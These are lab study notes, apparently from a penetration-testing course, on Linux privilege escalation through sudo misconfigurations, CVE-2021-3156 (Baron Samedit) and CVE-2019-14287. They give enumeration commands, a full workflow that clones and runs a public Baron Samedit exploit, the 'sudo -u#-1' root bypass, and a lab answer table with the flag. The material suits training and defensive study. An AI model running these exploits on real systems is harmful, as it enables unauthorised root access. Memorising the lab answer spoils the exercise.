## ID
530

## Module
Linux Privilege Escalation

## Kind
notes

## Title
Section 23 — Sudo

## Description
Covers privilege escalation via sudo misconfigurations and two critical sudo CVEs (CVE-2021-3156 Baron Samedit heap overflow and CVE-2019-14287 policy bypass), enabling root shells from low-privileged accounts.

## Tags
sudo, privilege-escalation, cve-2021-3156, cve-2019-14287, linux, 0-day

## Commands
- `sudo -V | head -n1`
- `sudo -l`
- `sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'`
- `cat /etc/lsb-release`
- `git clone https://github.com/blasty/CVE-2021-3156.git`
- `./sudo-hax-me-a-sandwich <TARGET_ID>`
- `sudo -u#-1 <ALLOWED_COMMAND>`
- `cat /etc/passwd | grep <USERNAME>`

## What This Section Covers
Sudo is a fundamental privilege boundary on Linux — the `/etc/sudoers` file defines who can run what as whom. This section demonstrates two real-world sudo vulnerabilities: CVE-2021-3156 (Baron Samedit), a heap-based buffer overflow present for 10+ years across major distros, and CVE-2019-14287, a policy bypass that abuses negative user IDs to resolve to UID 0 (root). Both yield immediate root shells from an unprivileged user.

## Methodology
1. Check sudo version with `sudo -V | head -n1` — this determines which CVEs apply.
2. Enumerate sudo privileges with `sudo -l` to see what commands the current user can run and as which users.
3. Review the sudoers file if readable: `sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'`.
4. **If sudo < 1.8.28** and a command is allowed as `ALL=(ALL)`: exploit CVE-2019-14287 by running `sudo -u#-1 /usr/bin/<command>` — the -1 UID wraps to 0 (root).
5. **If sudo is 1.8.31 (Ubuntu 20.04), 1.8.27 (Debian 10), or 1.9.2 (Fedora 33)**: exploit CVE-2021-3156 (Baron Samedit) — clone the PoC, `make`, identify the OS with `cat /etc/lsb-release`, and run `./sudo-hax-me-a-sandwich <TARGET_ID>`.
6. Once root, grab the flag: `find / -name flag.txt 2>/dev/null && cat /path/to/flag.txt`.

## Multi-step Workflow — CVE-2021-3156 (Baron Samedit)
```
sudo -V | head -n1
cat /etc/lsb-release
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich <TARGET_ID>
id
cat /root/flag.txt
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Escalate privileges and submit flag.txt | HTB{SuD0_e5c4l47i0n_1id} | SSH in → `sudo -V` shows 1.8.21p2 (< 1.8.28) → `sudo -l` shows `(ALL, !root) /bin/ncdu` → CVE-2019-14287: `sudo -u#-1 /bin/ncdu` → press `b` for shell → `cat /root/flag.txt` |

## Key Takeaways
- Always check `sudo -V` early in enumeration — sudo vulns are some of the easiest privesc wins and affect a huge installed base.
- CVE-2021-3156 (Baron Samedit) was a 10-year-old heap overflow; it's a reminder that even core utilities can harbor critical bugs for a decade.
- CVE-2019-14287 only requires one prerequisite: a sudoers entry allowing the user to run *any* command as ALL. The `-u#-1` trick wraps the UID to 0.
- The sudoers `ALL=(ALL)` vs `ALL=(ALL:ALL)` distinction matters — the first allows running as any user, the second as any user *and* group.
- On exam/lab targets, check both the sudo version *and* the sudoers policy — one might be exploitable even if the other isn't.

## Gotchas
- The CVE-2021-3156 PoC requires `gcc` and `make` on the target — if they're missing, you need to cross-compile on a matching OS version and transfer the binary.
- The PoC target IDs are version-specific; picking the wrong one will crash instead of giving a shell — always verify with `cat /etc/lsb-release` first.
- CVE-2019-14287 only works if the sudoers entry uses `ALL=(ALL)` — if it specifies a concrete user (e.g., `(www-data)`), the bypass doesn't apply.
